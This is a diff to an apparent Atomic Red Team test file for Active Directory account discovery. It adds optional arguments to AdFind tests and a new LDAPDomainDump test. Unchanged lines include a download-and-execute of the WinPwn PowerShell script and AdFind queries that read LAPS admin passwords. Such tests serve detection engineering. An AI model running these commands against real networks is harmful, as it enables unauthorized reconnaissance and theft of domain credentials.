@@ -74,6 +74,11 @@ atomic_tests:
     reference- http://www.joeware.net/freetools/tools/adfind/, https://social.technet.microsoft.com/wiki/contents/articles/7535.adfind-command-examples.aspx
   supported_platforms:
   - windows
+  input_arguments:
+    optional_args:
+      description: Allows defining arguments to add to the adfind command to tailor it to the specific needs of the environment. Use "-arg" notation to add arguments separated by spaces.
+      type: string
+      default:
   dependency_executor_name: powershell
   dependencies:
   - description: |
@@ -85,7 +90,7 @@ atomic_tests:
       Invoke-WebRequest -Uri "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1087.002/bin/AdFind.exe" -OutFile "PathToAtomicsFolder\..\ExternalPayloads\AdFind.exe"
   executor:
     command: |
-      "PathToAtomicsFolder\..\ExternalPayloads\AdFind.exe" -default -s base lockoutduration lockoutthreshold lockoutobservationwindow maxpwdage minpwdage minpwdlength pwdhistorylength pwdproperties
+      "PathToAtomicsFolder\..\ExternalPayloads\AdFind.exe" #{optional_args} -default -s base lockoutduration lockoutthreshold lockoutobservationwindow maxpwdage minpwdage minpwdlength pwdhistorylength pwdproperties
     name: command_prompt
 - name: Adfind - Enumerate Active Directory Admins
   auto_generated_guid: b95fd967-4e62-4109-b48d-265edfd28c3a
@@ -94,6 +99,11 @@ atomic_tests:
     reference- http://www.joeware.net/freetools/tools/adfind/, https://stealthbits.com/blog/fun-with-active-directorys-admincount-attribute/
   supported_platforms:
   - windows
+  input_arguments:
+    optional_args:
+      description: Allows defining arguments to add to the adfind command to tailor it to the specific needs of the environment. Use "-arg" notation to add arguments separated by spaces.
+      type: string
+      default:
   dependency_executor_name: powershell
   dependencies:
   - description: |
@@ -105,7 +115,7 @@ atomic_tests:
       Invoke-WebRequest -Uri "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1087.002/bin/AdFind.exe" -OutFile "PathToAtomicsFolder\..\ExternalPayloads\AdFind.exe"
   executor:
     command: |
-      "PathToAtomicsFolder\..\ExternalPayloads\AdFind.exe" -sc admincountdmp
+      "PathToAtomicsFolder\..\ExternalPayloads\AdFind.exe" -sc admincountdmp #{optional_args}
     name: command_prompt
 - name: Adfind - Enumerate Active Directory User Objects
   auto_generated_guid: e1ec8d20-509a-4b9a-b820-06c9b2da8eb7
@@ -114,6 +124,11 @@ atomic_tests:
     reference- http://www.joeware.net/freetools/tools/adfind/, https://www.fireeye.com/blog/threat-research/2019/04/pick-six-intercepting-a-fin6-intrusion.html
   supported_platforms:
   - windows
+  input_arguments:
+    optional_args:
+      description: Allows defining arguments to add to the adfind command to tailor it to the specific needs of the environment. Use "-arg" notation to add arguments separated by spaces.
+      type: string
+      default:
   dependency_executor_name: powershell
   dependencies:
   - description: |
@@ -125,7 +140,7 @@ atomic_tests:
       Invoke-WebRequest -Uri "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1087.002/bin/AdFind.exe" -OutFile "PathToAtomicsFolder\..\ExternalPayloads\AdFind.exe"
   executor:
     command: |
-      "PathToAtomicsFolder\..\ExternalPayloads\AdFind.exe" -f (objectcategory=person)
+      "PathToAtomicsFolder\..\ExternalPayloads\AdFind.exe" -f (objectcategory=person) #{optional_args}
     name: command_prompt
 - name: Adfind - Enumerate Active Directory Exchange AD Objects
   auto_generated_guid: 5e2938fb-f919-47b6-8b29-2f6a1f718e99
@@ -134,6 +149,11 @@ atomic_tests:
     reference- http://www.joeware.net/freetools/tools/adfind/, https://www.fireeye.com/blog/threat-research/2019/04/pick-six-intercepting-a-fin6-intrusion.html
   supported_platforms:
   - windows
+  input_arguments:
+    optional_args:
+      description: Allows defining arguments to add to the adfind command to tailor it to the specific needs of the environment. Use "-arg" notation to add arguments separated by spaces.
+      type: string
+      default:
   dependency_executor_name: powershell
   dependencies:
   - description: |
@@ -145,7 +165,7 @@ atomic_tests:
       Invoke-WebRequest -Uri "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1087.002/bin/AdFind.exe" -OutFile "PathToAtomicsFolder\..\ExternalPayloads\AdFind.exe"
   executor:
     command: |
-      "PathToAtomicsFolder\..\ExternalPayloads\AdFind.exe" -sc exchaddresses
+      "PathToAtomicsFolder\..\ExternalPayloads\AdFind.exe" -sc exchaddresses #{optional_args}
     name: command_prompt
 - name: Enumerate Default Domain Admin Details (Domain)
   auto_generated_guid: c70ab9fd-19e2-4e02-a83c-9cfa8eaa8fef
@@ -256,7 +276,6 @@ atomic_tests:
   - windows
   executor:
     command: |-
-      $S3cur3Th1sSh1t_repo='https://raw.githubusercontent.com/S3cur3Th1sSh1t'
       iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')
       generaldomaininfo -noninteractive -consoleoutput
     name: powershell
@@ -361,13 +380,17 @@ atomic_tests:
   supported_platforms:
   - windows
   input_arguments:
+    optional_args:
+      description: Allows defining arguments to add to the adfind command to tailor it to the specific needs of the environment. Use "-arg" notation to add arguments separated by spaces.
+      type: string
+      default:
     domain:
       description: Domain of the host
       type: string
       default: $env:USERDOMAIN
   executor:
     command: |
-      & "PathToAtomicsFolder\..\ExternalPayloads\AdFind.exe" -h #{domain} -s subtree -f "objectclass=computer" *
+      & "PathToAtomicsFolder\..\ExternalPayloads\AdFind.exe" #{optional_args} -h #{domain} -s subtree -f "objectclass=computer" *
     cleanup_command: 
     name: powershell
     elevation_required: false
@@ -378,13 +401,17 @@ atomic_tests:
   supported_platforms:
   - windows
   input_arguments:
+    optional_args:
+      description: Allows defining arguments to add to the adfind command to tailor it to the specific needs of the environment. Use "-arg" notation to add arguments separated by spaces.
+      type: string
+      default:
     domain:
       description: Domain of the host
       type: string
       default: $env:USERDOMAIN
   executor:
     command: |
-      & "PathToAtomicsFolder\..\ExternalPayloads\AdFind.exe" -h #{domain} -s subtree -f "objectclass=computer" ms-Mcs-AdmPwd, ms-Mcs-AdmPwdExpirationTime
+      & "PathToAtomicsFolder\..\ExternalPayloads\AdFind.exe" #{optional_args} -h #{domain} -s subtree -f "objectclass=computer" ms-Mcs-AdmPwd, ms-Mcs-AdmPwdExpirationTime
     cleanup_command: 
     name: powershell
     elevation_required: false
@@ -425,3 +452,45 @@ atomic_tests:
     command: |
       ldapsearch -H ldap://#{domain}.#{top_level_domain}:389 -x -D #{user} -w #{password} -b "CN=Users,DC=#{domain},DC=#{top_level_domain}" -s sub -a always -z 1000 dn
     name: sh
+- name: Account Enumeration with LDAPDomainDump
+  auto_generated_guid: a54d497e-8dbe-4558-9895-44944baa395f
+  description: |
+    This test uses LDAPDomainDump to perform account enumeration on a domain.
+    [Reference](https://securityonline.info/ldapdomaindump-active-directory-information-dumper-via-ldap/)
+  supported_platforms:
+  - linux
+  input_arguments:
+    username:
+      description: Username and domain to authenticate with
+      type: string
+      default: domain\user
+    target_ip:
+      description: IP to connect to
+      type: string
+      default: 127.0.0.1
+    password:
+      description: Password to authenticate with
+      type: string
+      default: password
+  dependency_executor_name: sh
+  dependencies:
+  - description: Python3 must be installed
+    prereq_command: if [ -x "$(command -v python3 --version)" ]; then exit 0; else exit 1; fi;
+    get_prereq_command: sudo apt-get -y install python3
+  - description: Pip must be installed
+    prereq_command: if [ -x "$(command -v pip --version)" ]; then exit 0; else exit 1; fi;
+    get_prereq_command: |-
+      wget -O /tmp/get-pip.py https://bootstrap.pypa.io/pip/3.6/get-pip.py
+      python3 /tmp/get-pip.py
+  - description: The ldapdomaindump module must be installed
+    prereq_command: python3 -c 'import ldapdomaindump' 2>/dev/null
+    get_prereq_command: pip install ldapdomaindump
+  - description: The future module must be installed
+    prereq_command: python3 -c 'import future' 2>/dev/null
+    get_prereq_command: pip install future
+  executor:
+    command: 'ldapdomaindump -u #{username} -p #{password} #{target_ip} -o /tmp/T1087'
+    cleanup_command: |
+      rm -rf /tmp/T1087/ 2>/dev/null 
+    name: sh
+    elevation_required: false
